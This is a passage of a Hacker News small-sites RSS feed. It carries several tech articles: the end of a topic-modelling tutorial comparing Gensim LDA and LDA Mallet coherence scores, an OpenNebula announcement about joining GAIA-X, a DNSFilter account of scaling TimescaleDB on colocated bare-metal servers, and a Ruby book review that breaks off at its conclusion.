<div><figure><img loading="lazy" width="613" height="651" src="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?resize=613%2C651&amp;ssl=1" alt="pyLDAvis visualization" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?w=613&amp;ssl=1 613w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?resize=282%2C300&amp;ssl=1 282w" sizes="(max-width: 613px) 100vw, 613px" data-recalc-dims="1"></figure></div>



<p>A good topic model will have big and non-overlapping bubbles scattered throughout the chart. As we can see from the graph, the bubbles are clustered within one place. Can we do better than this?</p>



<p>Yes, because luckily, there is a better model for topic modeling called LDA Mallet.</p>






<h2>How to use LDA Mallet Model</h2>



<p>Our model will be better if the words in a topic are similar, so we will use topic coherence to evaluate our model. Topic coherence evaluates a single topic by measuring the degree of semantic similarity between high scoring words in the topic. <strong>A good model will generate topics with high topic coherence scores.</strong></p>



<pre>
coherence_model_lda = CoherenceModel(model=lda_model, texts=tweets, dictionary=id2word, coherence=<span>'c_v'</span>)
coherence_lda = coherence_model_lda.get_coherence()
print(<span>'\\nCoherence Score: '</span>, coherence_lda)

Coherence Score:  <span>0.3536443343685833</span>
</pre>



<p>This is our baseline. We have just used Gensimâ€™s inbuilt version of the <a href="https://diging.github.io/tethne/api/tutorial.mallet.html" target="_blank" rel="noreferrer noopener nofollow">LDA algorithm</a>,&nbsp;but there is an LDA model that provides better quality of topics called the <a href="https://medium.com/swlh/topic-modeling-lda-mallet-implementation-in-python-part-2-602ffb38d396"><strong>LDA Mallet Model</strong></a>.</p>



<p><strong>Letâ€™s see if we can do better with LDA Mallet.&nbsp;</strong></p>



<pre>mallet_path = <span>'patt/to/mallet-2.0.8/bin/mallet'</span> 
ldamallet = gensim.models.wrappers.LdaMallet(mallet_path, corpus=corpus, num_topics=<span>20</span>, id2word=id2word)


pprint(ldamallet.show_topics(formatted=<span>False</span>))


coherence_model_ldamallet = CoherenceModel(model=ldamallet, texts=tweets, dictionary=id2word, coherence=<span>'c_v'</span>)
coherence_ldamallet = coherence_model_ldamallet.get_coherence()
print(<span>'\\nCoherence Score: '</span>, coherence_ldamallet)

Coherence Score:  <span>0.38780981858635866</span></pre>



<p><strong>The coherence score is better! </strong>Can the score be better if we increase or decrease the number of topics? Letâ€™s find it out by fine-tuning the model. <a href="https://www.machinelearningplus.com/nlp/topic-modeling-gensim-python/#16buildingldamalletmodel" target="_blank" rel="noreferrer noopener nofollow">This tutorial</a> provides an excellent explanation of how to tune the LDA model. Below is the source code from the article:</p>



<pre><span><span>def</span> <span>compute_coherence_values</span><span>(dictionary, corpus, texts, limit, start=<span>2</span>, step=<span>3</span>)</span>:</span>
    <span>"""
    Compute c_v coherence for various number of topics

    Parameters:
    ----------
    dictionary : Gensim dictionary
    corpus : Gensim corpus
    texts : List of input texts
    limit : Max num of topics

    Returns:
    -------
    model_list : List of LDA topic models
    coherence_values : Coherence values corresponding to the LDA model with respective number of topics
    """</span>
    coherence_values = []
    model_list = []
    <span>for</span> num_topics <span>in</span> range(start, limit, step):
        model = â€¦</pre></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know">https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know</a></em></p>]]>
            </description>
            <link>https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150399</guid>
            <pubDate>Thu, 19 Nov 2020 15:24:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenNebula joins GAIA-X as Day-1 Member]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150302">thread link</a>) | @amarti
<br/>
November 19, 2020 | https://opennebula.io/opennebula-joins-gaia-x/ | <a href="https://web.archive.org/web/*/https://opennebula.io/opennebula-joins-gaia-x/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			    <!-- .entry-header -->

				
					
<article id="post-28679">

    <!-- .entry-header -->

    <div>

		
<p>Back in June we already announced that <strong>OpenNebula</strong>, as part of its <a rel="noreferrer noopener" href="https://oneedge.io/" target="_blank">ONEedge</a> initiativeâ€”the EU-funded project to build the first open source Edge Computing platform in Europeâ€”was <a href="https://opennebula.io/opennebula-contributes-to-gaia-x/">contributing to GAIA-X</a> with its expertise in distributed and federated cloud environments, hyperconverged cloud infrastructures, complex storage and virtual networking architectures, management and automation tools for large cloud deployments, and <strong>edge computing</strong>.</p>



<p>We are now delighted to confirm that <strong>OpenNebula Systems</strong> has joined this pan-European project as a <strong>Day-1 Member of the GAIA-X AISBL</strong> (in incorporation), the international non-profit association that is going to provide a formal structure to this initiative, coordinating the efforts of the GAIA-X Community, promoting international cooperation, and developing the necessary regulatory frameworks and rules to ensure the interoperability and reliability of the providers, services and data sources made available through GAIA-X. This announcement has taken place during the <a rel="noreferrer noopener" href="https://events.talque.com/gaia-x-summit/en/6iq6yI5LPSxaIRA6cmnq" target="_blank">GAIA-X Summit</a> (Nov 18-19, 2020), an event that marks an important milestone for the project! ğŸš€</p>



<figure><video controls="" src="https://opennebula.io/wp-content/uploads/2020/11/GaiaX_Intro.mp4"></video></figure>



<p>ğŸ‡ªğŸ‡º The <a rel="noreferrer noopener" href="https://www.data-infrastructure.eu/" target="_blank">GAIA-X project</a> supports the goals of the <a rel="noreferrer noopener" href="https://ec.europa.eu/info/strategy/priorities-2019-2024/europe-fit-digital-age/european-data-strategy_en" target="_blank">European data strategy</a>, which emphasizes the economic and social opportunities of data as well as European values and laws (e.g. GDPR). The common goal of the organizations joining the project is to create GAIA-X as a basis for a sovereign, European data infrastructure, which provides interoperability between different data creating and processing entities via federated services. One of our main tasks will be to make sure that <strong>OpenNebula</strong> Cloud Service Providers and Corporate Users can get the most out of the GAIA-X federated cloud infrastructure and of the resources that will be made available through this new <strong>European virtual hyperscaler</strong>.</p>



<div><p>The <strong>OpenNebula Webinar on GAIA-X</strong> that took place on September 8, 2020 is available on demand: <a href="https://opennebula.io/webinars">https://opennebula.io/webinars</a> Many thanks to our amazing guest speakers, <strong>Andreas Weiss</strong> (Director of EuroCloud Germany) and <strong>Mirko Lampe</strong> (Coordinator of GAIA-X Workstream 2â€”Technical Implementation).</p><p>We have created a <strong>GAIA-X Working Group</strong> within the OpenNebula Community, so <strong>Cloud Service Providers and Corporate Users</strong> interested in GAIA-X, or planning to join this initiative, please let us know by sending an email to <a href="https://opennebula.org/contact/">community@opennebula.io</a> ğŸ“¡</p></div>
		
		


        <div>
            <p><img alt="" src="https://secure.gravatar.com/avatar/7bc2911f4ae58287da05140e43efc2f6?s=96&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/7bc2911f4ae58287da05140e43efc2f6?s=192&amp;d=mm&amp;r=g 2x" height="96" width="96">            </p>
            <div>
                <p><span id="autorblog">Alberto P. MartÃ­</span></p><p>Open Source Community Manager at OpenNebula</p>
            </div>
        </div>
	</div><!-- .entry-content -->

</article><!-- #post-## -->

					
<!-- #comments -->

				
			</div></div>]]>
            </description>
            <link>https://opennebula.io/opennebula-joins-gaia-x/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150302</guid>
            <pubDate>Thu, 19 Nov 2020 15:13:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two Years of Scaling TimescaleDB Without Clustering]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150265">thread link</a>) | @serenadns
<br/>
November 19, 2020 | https://www.dnsfilter.com/blog/timescaledb-performance/ | <a href="https://web.archive.org/web/*/https://www.dnsfilter.com/blog/timescaledb-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-elementor-type="wp-post" data-elementor-id="4345" data-elementor-settings="[]"><div><div><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="a1c80e6" data-element_type="section"><div><div><div data-id="5ff4de5" data-element_type="column"><div><div><div data-id="9e21dcc" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>Itâ€™s been over 2 years since we made the switch from </span><a href="https://fltr.ai/2OOM" target="_blank" rel="noopener"><span>InfluxDB to TimescaleDB</span></a><span> at DNSFilter. You can read the </span><a href="https://fltr.ai/2OOO" target="_blank" rel="noopener"><span>original blog</span></a><span> for all the details on why we transitioned to TimescaleDB in the first place, but the main thing we were after was reliability. Weâ€™re still using TimescaleDB, and unsurprisingly weâ€™ve made a lot of changes to our infrastructure since that original post as our total users have continued to grow. Over the last 2 years weâ€™ve worked to optimize TimescaleDB performance, and weâ€™ve done it all </span><i><span>without</span></i><span> clustering.</span></p><h2><span>Expectation Vs. Reality</span></h2><p><span>In 2018, I made the prediction that we could get to 3B queries per day without major structural changes to our setup. I wasnâ€™t quite wrong, but I wasnâ€™t totally right either.&nbsp;</span></p><p><span>After going roughly 18 months without issues (with daily queries steadily growing), we hit over 1.2B for the first time in October of 2019. It was the first sign that the actual hardware supporting TimescaleDB would have trouble getting to 3B daily queries. The server had trouble keeping up with </span><a href="https://kafka.apache.org/" target="_blank" rel="noopener"><span>Kafka</span></a><span>, and the lag was </span><i><span>hours</span></i><span> long. We werenâ€™t losing queries like we had previously with InfluxDB, but the disk I/O of our TimescaleDB server had trouble keeping up.</span></p></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="9b23b4b" data-element_type="section"><div><div><div data-id="e8c98dd" data-element_type="column"><div><div><div data-id="208228a" data-element_type="widget" data-widget_type="image.default"><div><div><figure> <img width="1024" height="329" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png" alt="TimescaleDB Performance on our old server" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-300x96.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-768x246.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-500x160.png 500w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio.png 1331w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-300x96.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-768x246.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-500x160.png 500w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio.png 1331w"><figcaption>You can see the server struggle in October 2019 and then hit a temporary wall in March 2020.</figcaption></figure></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="7d801f6" data-element_type="section"><div><div><div data-id="7902b84" data-element_type="column"><div><div><div data-id="3ec0127" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>We tweaked the ram usage in PostgreSQL and started to plan for a new approach.</span></p><p><span>At the time, this was just a spike in daily queries, but we knew we were approaching the moment where we would have to sustain over 1B queries daily. To help us out, we looked at setting up a virtual machine with </span><a href="https://www.digitalocean.com/" target="_blank" rel="noopener"><span>Digital Ocean</span></a><span>.</span></p><p><span>The original intention wasnâ€™t to replace that server, it was just to take the load off of it. We wound up setting up 2 additional servers with Digital Ocean.&nbsp;</span></p><p><span>In February, our original server hit another wall and by March the Digital Ocean servers were officially online. For a few months, we had 3 TimescaleDB servers running (all receiving the same information) until it became clear the original server was no longer necessary. It wasnâ€™t carrying much of the load anymore, and it was not as performant as the Digital Ocean servers. At that point, it was just deadweight and extra costs, so we deprecated it in June 2020.</span></p><h2><span>The spike that didnâ€™t stop</span></h2><p><span>As of fall 2020, our daily requests have skyrocketed compared to where we were this time last year (even with that October spike in requests). To handle this sustained surge in requests, weâ€™ve done something a little different: We now have one bare metal TimescaleDB server set up to handle </span><i><span>just</span></i><span> DNS requests. Our 2 Digital Ocean servers are currently still going strong, handling unique queries from our app and a portion of daily requests.</span></p><p><span>This change was prompted to accommodate an integration partner, but the cool thing is that weâ€™ve actually doubled my original projection with this move. That bare metal server now processes about 6B requests per day. Granted, it does not handle the full load the Digital Ocean servers do. It handles DevOps monitoring of our infrastructure, handling far fewer read queries than our primary Digital Ocean server. Though it still processes a large number of requests daily with only 5% CPU utilization.</span></p><p><span>Meanwhile, the main Digital Ocean server rarely goes over 30% CPU utilization. Though as Iâ€™ll get into later, CPU isnâ€™t the best metric for monitoring the health of these servers.</span></p><h2><span>The beginning of a major move to bare metal</span></h2></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="308de7c" data-element_type="section"><div><div><div data-id="746c630" data-element_type="column"><div><div><div data-id="ae9e5a0" data-element_type="widget" data-widget_type="image.default"><div><div><figure> <img width="1024" height="576" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png" alt="TimescaleDB performance on bare metal" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-300x169.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-768x432.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1536x864.png 1536w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-2048x1152.png 2048w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-500x281.png 500w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-300x169.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-768x432.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1536x864.png 1536w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-2048x1152.png 2048w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-500x281.png 500w"><figcaption>This is our bare metal server. Our hosting provider is always nice enough to send a picture my way when I ask. They even gave me one as a magnet.</figcaption></figure></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="43cd417" data-element_type="section"><div><div><div data-id="17169e9" data-element_type="column"><div><div><div data-id="c2094d2" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>In the past, we were renting servers. But we didnâ€™t see that being sustainable for our business long-term.</span></p><p><span>We saw 3 possible options, and we ran costs on all of them:</span></p><ul><li><span>Colocation</span></li><li><span>Continued server rental</span></li><li><span>A major move to AWS</span></li></ul><p>Colocation was the clear winner.</p><p><span>While you need to put money down upfront, the costs begin to go down month over month. After 3 years, our server costs will be half of what they would be if we continued rentingâ€”and nearly 1/17 of what a switch to AWS would be.&nbsp;</span></p><p><span>While the monetary benefits are pretty obvious, the actual drive performance of the colocated server would be 10 times better than the AWS servers. On top of that, our setup included 648TB/month, which would have cost us $37,000 </span><i><span>alone</span></i><span> with AWS.</span></p><p><span>That bare metal server handling 6B requests daily is a </span><a href="https://netactuate.com/colocation/" target="_blank" rel="noopener"><span>colocated server</span></a><span> we built with the help of our hosting provider, </span><a href="https://netactuate.com/" target="_blank" rel="noopener"><span>NetActuate</span></a><span>.</span></p><p><span>With the performance weâ€™re currently seeing on our bare metal server (and the cost savings), we plan on migrating </span><i><span>everything</span></i><span> from Digital Ocean to bare metal. I just donâ€™t see anything but colocation being able to meet our needs into the future.</span></p><p><span>Using colocated servers allows us to have the fastest, newest machines at a lower cost. I told NetActuate the specs I was looking for in a server, and then their team built everything, shipped it to the data center, and racked it for us.</span></p><p><span>Itâ€™s a happy medium. I donâ€™t want DNSFilter to be in the business of running its own datacenter. Going this route still allows me to be hands-on while not having to worry about the actual hardware day-to-day.</span></p><p><span>The main challenge for me now is hiring DevOps staff to handle ongoing infrastructure and performance management that Iâ€™ve been doing the majority of.</span></p><h2><span>Monitoring&nbsp;</span></h2><p><span>Before putting any hardware into production, first I use </span><a href="https://serverscope.io/" target="_blank" rel="noopener"><span>ServerScope</span></a><span> to understand how performant that hardware can possibly be. It also lets me know if there is anything that might indicate a defect in the hardware. Thatâ€™s something that might cause limitations to the hardwareâ€™s life expectancy.</span></p><p><span>To monitor all of our servers, across both our Timescale database and our anycast network, we use </span><a href="https://www.site24x7.com/" target="_blank" rel="noopener"><span>Site24x7</span></a><span>. Here, Iâ€™m able to check on KPIs, with the most important one in my day-to-day being Disk I/O.</span></p></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="1198909" data-element_type="section"><div><div><div data-id="f411b25" data-element_type="column"><div><div><div data-id="972d48e" data-element_type="widget" data-widget_type="image.default"><div><p><img width="842" height="429" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio.png" alt="Last 3 months TimescaleDB performance" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio.png 842w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-300x153.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-768x391.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-840x429.png 840w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-500x255.png 500w" data-sizes="(max-width: 842px) 100vw, 842px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio.png 842w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-300x153.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-768x391.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-840x429.png 840w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-500x255.png 500w"></p></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="4bca6c0" data-element_type="section"><div><div><div data-id="52574cc" data-element_type="column"><div><div><div data-id="2d4a946" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>The image above represents the Disk I/O of our main production server over Q3 2020. You can see it held steadily around 60 MB/sec for disk writes until the end of September. Thatâ€™s around the time we had a huge uptick in daily queries, causing additional strain on the server. After seeing this, we decided to add our bare metal server to start handling a large portion of DNS queries. This took some of the load off of our primary server that is still handling user interface queries (in addition to a portion of DNS requests).</span></p><p><span>However, IOPS (Input/Output Operations Per Second) is arguably the best metric to look at since databases do short bursts of access. This is in contrast to a sustained (and uninterrupted) transfer, similar to the way a file server might write information. When using ServerScope, IOPS is the most significant metric I check prior to putting a server in production. Itâ€™s valuable to know what IOPS that server is capable of handling. To get an idea of the capacity weâ€™re looking for, </span><a href="https://www.wiredzone.com/shop/product/10028190-intel-ssdpe2ke064t8-hard-drive-nvme-6-4tb-u-2-2-5in-pcie-3-1-3d-tlc-3dwpd-dc-p4610-series-2294" target="_blank" rel="noopener"><span>one recent storage drive</span></a><span> we put into production has a random read of 654k IOPS and random write of 210k IOPS.</span></p><p><span>CPU utilization is useful to know, but really you just want to make sure that your server isnâ€™t hitting over 80% for days or weeks at a time. Thatâ€™s a sign itâ€™s working too hard and it needs some help.&nbsp;</span></p><p><span>Another aspect we monitor is Kafka lag. What we saw in October 2019 (and later in March 2020) was TimescaleDB suddenly falling behind. In fact, it was </span><i><span>hours</span></i><span> behind. Once we saw the lag, we could investigate Disk I/O to see what the root cause of the problem was. The issue here was (again) that huge amount of new queries. TimescaleDB was suddenly writing an amount of data from Kafka it was not accustomed to writing and could not keep up. Without the ability to discover what caused the lag and subsequently working to fix it, we would have continued to get further and further behind.</span></p><h2><span>No clusters, no problemâ€¦yet</span></h2><p><span>We are still running on open source TimescaleDB after 2 years. Itâ€™s been able to handle all of the additional queries weâ€™re now getting with our increase in users after the hardware changes Iâ€™ve talked about above. And on top of that, we havenâ€™t used clustering </span><i><span>at all</span></i><span>.</span></p><p><span>With the announcement of </span><a href="https://blog.timescale.com/blog/timescaledb-2-0-a-multi-node-petabyte-scale-completely-free-relational-database-for-time-series/" target="_blank" rel="noopener"><span>TimescaleDB 2.0</span></a><span> and the option to use clustering for multi-node deployments in the open source version, we can continue to use open source TimescaleDB without an issue.</span></p><p><span>Weâ€™re still running a single node instance, but we do plan on implementing clusters at some point. Weâ€™ve tested clustering in the past, but there were bugs, so we never committed fully. We also havenâ€™t used partitioning. If we try clustering again and we still run into issues or if it doesnâ€™t allow us to scale the way we want to, partitioning is the next thing on the list for us to test.</span></p><p><span>One recent optimization weâ€™ve made is to have chunks fit in RAM. This is a recommendation I discovered recently in </span><a href="https://docs.timescale.com/latest/api#create_hypertable-best-practices" target="_blank" rel="noopener"><span>TimescaleDBâ€™s documentation around best practices</span></a><span>.&nbsp;</span></p><p><span>For a long time, we had our chunk interval set as a single day (24 hours). When we werenâ€™t even breaking 200M queries a few years ago, that was fine. But weâ€™ve grown so much, so each of our TimescaleDB servers has a separate chunk interval time. Our primary server is now set at 4 hours, and our dedicated query server (the one handling 6B queries daily) is set to </span><b>20 minutes</b><span>. This is a recent change, so it will take some time to get a clear idea of how much this change has benefited our infrastructure.</span></p><p><span>After 2 years of scaling TimescaleDB, I can make more accurate estimates and plan better. Now I know what type of stress 1B queries will put on our current servers and what changes need to be made to accommodate those new queries. Weâ€™ve also carefully mapped out our costs for the next 3 years, which will only benefit us when we run into the inevitable hiccup.&nbsp;</span></p><p><span>There is a lot more we plan on testing with TimescaleDB going forward, but we have a good idea of what the future of our server infrastructure will look like.</span></p></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="fa18430" data-element_type="section"></section></div></div></div></div></div>]]>
            </description>
            <link>https://www.dnsfilter.com/blog/timescaledb-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150265</guid>
            <pubDate>Thu, 19 Nov 2020 15:09:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Review of the Ruby Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25150125">thread link</a>) | @connerj
<br/>
November 19, 2020 | https://www.connerjensen.com/blog/the_ruby_programming_language_review | <a href="https://web.archive.org/web/*/https://www.connerjensen.com/blog/the_ruby_programming_language_review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>My Review of The Ruby Programming Language</h3>
<p>I needed to learn Ruby for a new job I was starting, and after a quick google search I came across <em>The Ruby Programming Language</em>.</p>
<p>After ordering it off <a href="https://www.amazon.com/Ruby-Programming-Language-Everything-Need/dp/0596516177/ref=sr_1_3?dchild=1&amp;keywords=the+ruby+programming+language&amp;qid=1602857932&amp;sr=8-3">Amazon</a> and receiving it in the mail, I cracked it open and began reading.</p>
<p><strong><em>The following is a list of things that I learned from reading this book, hopefully they will be as helpful to you as they were to me.</em></strong></p>
<p>One of the first things I was curious about is how Ruby developers view documentation.</p>
<p>The book quickly answered my question by introducing me to <em>ri</em> ruby documentation tool.</p>
<h4>ri ruby documentation</h4>
<p><em>ri</em> can be invoked followed by the name of a Ruby class, module or method and you can view the documentation right there in your terminal.</p>
<pre><code>ri String
</code></pre>
<p>The next great thing this book introduced to me was the ability to run ruby with the -w flag</p>
<h4>Ruby with the -w flag</h4>
<p>Coming from a compiled language I was missing some of the feedback it gave me while writing programs.</p>
<p>The ruby -w flag will warn you about possible things that could break your program while it is executing and takes the place of helpful compile time errors/warnings</p>
<h4>All numeric objects are immutable</h4>
<p>There are no methods that allow you to change the value of a numeric object. This is nice to know when passing numeric objects around, there is no need to worry that a method will modify the numeric object.</p>
<h4>Avoid using string literals in loops</h4>
<p>String literals are mutable, therefore Ruby cannot use the same object to represent two identical string literals.</p>
<pre><code>i = 0
while i &lt; 100
    print "hello".object_id
end
</code></pre>
<p>If you are using string literals in a loop, a new string will be created for each iteration of the loop.</p>
<h4>Make a copy of an array</h4>
<p>You can make a copy of an existing array by passing it to <code>Array.new(array_to_be_copied)</code></p>
<p>This will be useful if you don't want to mutate the old array and you want to keep your methods pure.</p>
<h4>Use symbols when you don't care about content</h4>
<p>If you are using strings not for their content, but as a unique identifier, then you should use a symbol, they are cheaper and immutable by default.</p>
<h4>Most objects are passsed by reference (pass-reference-by-value)</h4>
<p>All objects, except for Fixnum, and Symbol are passed by reference, which means the method they are passed to can mutate them.</p>
<p>Changes made to an object inside a method are visible outside the methods scope.</p>
<p>Ruby actually uses <a href="https://robertheaton.com/2014/07/22/is-ruby-pass-by-reference-or-pass-by-value/">pass-reference-by-value</a> semantics, which has some subtle, but important, differences (thanks to <a href="https://news.ycombinator.com/user?id=billyruffian">billyruffian</a> for pointing this out).</p>
<h4>Difference between an Objects <strong>Class</strong> and an Objects <strong>Type</strong></h4>
<p>An object only ever has one class and it never changes throughout the life of the object.</p>
<p>An objects's type can change throughout the life of the object. Type is defined as the set of behaviors that an object responds to, or put another way, the set of methods this object has.</p>
<p>Use is _ a? to check an objects class and respond _ to? to check an objects type.</p>
<p>An Objects type is also known as duck typing, if it walks like a duck and talks like a duck, then it's a duck.</p>
<h4>Only nil and false are False</h4>
<p>The only two values in ruby that are False are nil and false. Even an empty string "" or 0 are truthy.</p>
<h4>Multiple assignment with many left values and a single right value</h4>
<pre><code>x, y, z = [1,2,3]
</code></pre>
<p>This assignment will produce the outcome of x = 1, y = 2, and z = 3</p>
<h4>The ? operator is the only ternary operator (three operands) in ruby</h4>
<pre><code>n == 1 ? 'message' : 'message'
</code></pre>
<p>This acts as a compact if/then/else statements</p>
<p>If the expression on the left evalutates to true, then the value on the left side of : is used, otherwise the value on the right side of : is used.</p>
<h4>Raising exceptions</h4>
<p>Raise an exception with <code>raise</code> method. If called with no arguments it raises a <strong>RuntimeError</strong>. If called with a single string argument it creates a new RuntimeError exception object with the specified string as its message.</p>
<h4>Handling exceptions</h4>
<p>Handle an exception with the a <code>begin</code> statement and a <code>rescue</code> clause.</p>
<pre><code>begin
  #attempt some statements
rescue
  #write your exceptions handling code here
end
</code></pre>
<h4>Name the exception object</h4>
<p>You can name the exception in the rescue clause, then use it in your exception handling code.</p>
<pre><code>begin
  #attempt some statements
rescue =&gt; ex
  #handle the exception here
  puts "#{ex.class}: #{ex.message}"
end
</code></pre>
<h4>Using Proc objects</h4>
<p>If you have the following code</p>
<pre><code>a, b = [1,2,3], [4,5]
sum = a.inject(0) { |total, x| total + x }
sum = b.inject(sum) { |total, x| total + x }
</code></pre>
<p>You can remove the duplication of the blocks by creating a proc object</p>
<pre><code>summation = Proc.new { |total, x| total +x }
</code></pre>
<p>Then, as long as you prefix it with &amp;, you can pass this proc Object as the last parameter of any method invocation,</p>
<pre><code>sum = a.inject(0, &amp;summation)
sum = b.inject(sum, &amp;summation)
</code></pre>
<h4>Return statements in blocks and Procs</h4>
<p>Using <code>return</code> in a block will not only return to the invoking iterator, but it also returns from the method that invoked the iterator</p>
<p>Using <code>return</code> in a Proc has the same behavior, but with some added complexity.</p>
<p>Because turning a block into a Proc object allows us to pass this Proc object around to other methods, when the Proc object calls <code>return</code> it may attempt to return from a method call that has already been returned from. This will raise a <strong><em>LocalJumpError</em></strong></p>
<h4>Return statements in Lambdas</h4>
<p>Because lambdas are much like methods, using <code>return</code> in a lambda will work like a <code>return</code> statement in a method. It will return control to the enclosing scope in which the lambda was called in.</p>
<p>This makes it so we never need to worry about a <strong><em>LocalJumpError</em></strong></p>
<h3>Conclusion</h3>
